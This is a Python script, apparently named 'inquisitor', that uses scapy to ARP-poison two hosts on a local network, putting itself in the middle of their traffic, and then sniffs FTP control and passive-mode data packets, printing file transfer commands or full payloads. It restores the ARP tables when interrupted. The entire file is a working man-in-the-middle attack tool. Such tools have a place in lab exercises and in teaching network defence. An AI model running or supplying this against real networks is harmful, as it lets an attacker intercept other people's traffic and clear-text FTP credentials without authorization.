import sys
import time
import signal
import threading
from scapy.all import ARP, Ether, IP, TCP, sendp, sniff

# Cache to deduplicate packets seen twice (forward + retransmit by attacker)
_seen_seqs = {}
_seen_lock = threading.Lock()
_CACHE_MAX = 512


def parse_args():
    verbose = False
    args = sys.argv[1:]

    if '-v' in args:
        verbose = True
        args.remove('-v')

    if len(args) != 4:
        print("Usage: inquisitor [-v] <IP-src> <MAC-src> <IP-target> <MAC-target>")
        sys.exit(1)

    return args[0], args[1], args[2], args[3], verbose


def arp_poison(ip_src, mac_src, ip_target, mac_target, stop_event):
    pkt_to_src    = Ether(dst=mac_src)    / ARP(op=2, pdst=ip_src,    hwdst=mac_src,    psrc=ip_target)
    pkt_to_target = Ether(dst=mac_target) / ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src)

    while not stop_event.is_set():
        sendp(pkt_to_src,    verbose=False)
        sendp(pkt_to_target, verbose=False)
        time.sleep(2)


def arp_restore(ip_src, mac_src, ip_target, mac_target):
    pkt_to_src    = Ether(dst=mac_src)    / ARP(op=2, pdst=ip_src,    hwdst=mac_src,    psrc=ip_target, hwsrc=mac_target)
    pkt_to_target = Ether(dst=mac_target) / ARP(op=2, pdst=ip_target, hwdst=mac_target, psrc=ip_src,    hwsrc=mac_src)

    sendp(pkt_to_src,    count=5, verbose=False)
    sendp(pkt_to_target, count=5, verbose=False)
    print("\n[*] ARP tables restored.")


def is_duplicate(packet):
    """Return True if this TCP seq+payload combination was already seen."""
    key = (packet[IP].src, packet[IP].dst, packet[TCP].seq)
    with _seen_lock:
        if key in _seen_seqs:
            return True
        # Keep cache bounded
        if len(_seen_seqs) >= _CACHE_MAX:
            # Remove oldest half
            for old in list(_seen_seqs.keys())[:_CACHE_MAX // 2]:
                del _seen_seqs[old]
        _seen_seqs[key] = True
    return False


PASV_MIN = 21100
PASV_MAX = 21110


def is_control_port(port):
    return port == 21


def is_pasv_port(port):
    return PASV_MIN <= port <= PASV_MAX


def packet_callback(packet, verbose):
    if not (packet.haslayer(TCP) and packet.haslayer(IP)):
        return

    sport = packet[TCP].sport
    dport = packet[TCP].dport
    on_control = is_control_port(sport) or is_control_port(dport)
    on_pasv    = is_pasv_port(sport)    or is_pasv_port(dport)

    if not (on_control or on_pasv):
        return
    if is_duplicate(packet):
        return

    try:
        payload = bytes(packet[TCP].payload).decode('utf-8', errors='ignore').strip()
        if not payload:
            return

        # Control channel: show commands and responses
        if on_control:
            if verbose:
                print(f"[FTP] {packet[IP].src} -> {packet[IP].dst} : {payload}")
            elif payload.startswith(('RETR', 'STOR')):
                print(f"[FTP] {packet[IP].src} -> {packet[IP].dst} : {payload}")

        # PASV data channel: show filename from transfer responses (226)
        elif on_pasv and verbose:
            first_line = payload.splitlines()[0]
            print(f"[FTP-DATA] {packet[IP].src} -> {packet[IP].dst} : {first_line}")

    except Exception:
        pass


def ftp_sniffer(verbose, stop_event):
    sniff(
        filter=f"tcp port 21 or (tcp portrange {PASV_MIN}-{PASV_MAX})",
        prn=lambda p: packet_callback(p, verbose),
        store=False,
        stop_filter=lambda p: stop_event.is_set()
    )


def main():
    ip_src, mac_src, ip_target, mac_target, verbose = parse_args()

    stop_event = threading.Event()

    def handle_sigint(sig, frame):
        print("\n[*] Stopping attack...")
        stop_event.set()
        arp_restore(ip_src, mac_src, ip_target, mac_target)
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_sigint)

    print(f"[*] ARP poisoning: {ip_src} ({mac_src}) <-> {ip_target} ({mac_target})")

    poison_thread = threading.Thread(
        target=arp_poison,
        args=(ip_src, mac_src, ip_target, mac_target, stop_event),
        daemon=True
    )
    poison_thread.start()

    print(f"[*] Sniffing FTP traffic{' (verbose)' if verbose else ''}...")
    ftp_sniffer(verbose, stop_event)


if __name__ == "__main__":
    main()